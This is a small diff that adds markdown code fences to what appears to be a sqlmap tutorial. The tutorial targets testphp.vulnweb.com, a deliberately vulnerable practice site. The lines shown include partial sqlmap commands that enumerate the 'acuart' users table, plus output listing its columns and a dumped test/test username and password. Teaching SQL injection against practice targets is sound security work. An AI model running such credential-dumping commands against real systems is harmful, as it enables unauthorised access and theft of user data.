@@ -163,7 +163,7 @@ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -
 
 Example output:
 
-bash
+```bash
 Database: acuart
 Table: users
 [8 columns]
@@ -179,7 +179,7 @@ Table: users
 | phone   | varchar(100) |
 | uname   | varchar(100) |
 +---------+--------------+
-
+```
 
 Columns like uname (username) and pass (password) are of interest.
 
@@ -194,7 +194,7 @@ sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" -D acuart -T users -
 
 Example output:
 
-bash
+```bash
 Table: users
 [1 entry]
 +-------+------+
@@ -202,7 +202,7 @@ Table: users
 +-------+------+
 | test  | test |
 +-------+------+
-
+```
 
 This retrieves usernames and passwords from the users table.
 
